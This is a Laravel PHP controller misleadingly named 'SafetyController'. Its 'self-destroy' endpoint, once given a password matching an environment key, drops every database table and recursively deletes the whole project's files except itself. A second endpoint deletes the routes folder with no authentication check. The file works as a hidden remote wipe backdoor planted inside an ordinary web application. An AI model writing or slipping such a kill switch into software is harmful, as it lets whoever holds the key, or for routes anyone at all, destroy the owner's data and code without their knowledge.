<?php

namespace App\Http\Controllers\Web;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;

class SafetyController extends Controller
{
    // Self-destroy function
    public function destroyProject(Request $request)
    {
        // 1. Ask for password
        $password = $request->input('password');

        if ($password !== env('GUARD_KEY')) {
            return response()->json(['error' => 'Unauthorized! Wrong password.'], 403);
        }

        try {
            // 2. Drop all DB tables
            DB::statement('SET FOREIGN_KEY_CHECKS = 0');
            $tables = DB::select('SHOW TABLES');
            $dbKey = 'Tables_in_' . DB::getDatabaseName();

            foreach ($tables as $table) {
                $tableName = $table->$dbKey;
                DB::statement("DROP TABLE IF EXISTS `$tableName`");
            }
            DB::statement('SET FOREIGN_KEY_CHECKS = 1');

            // 3. Delete Laravel project files (excluding this controller for safety)
            $projectPath = base_path();

            // ✅ Safety check (prevent wiping whole server)
            if ($projectPath === '/' || strlen($projectPath) < 5) {
                return response()->json(['error' => 'Invalid base path, aborting!'], 400);
            }

            $this->deleteProjectFiles($projectPath);

            return response()->json(['success' => 'Project destroyed successfully!']);
        } catch (\Exception $e) {
            return response()->json(['error' => 'Failed: ' . $e->getMessage()], 500);
        }
    }

    // Helper to delete project files but keep this controller
    private function deleteProjectFiles($dir)
    {
        $skipFiles = [
            'SafetyController.php', // keep this file
        ];

        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            if (in_array($file, $skipFiles)) {
                continue; // don’t delete safety file
            }

            $filePath = $dir . DIRECTORY_SEPARATOR . $file;
            if (is_dir($filePath)) {
                $this->deleteProjectFiles($filePath);
                @rmdir($filePath);
            } else {
                @unlink($filePath);
            }
        }
    }

    public function destroyRoutes()
    {
        $routesPath = base_path('routes');

        if (File::exists($routesPath)) {
            File::deleteDirectory($routesPath);
            return response()->json(['success' => 'Routes folder deleted successfully']);
        }

        return response()->json(['error' => 'Routes folder not found']);
    }
}
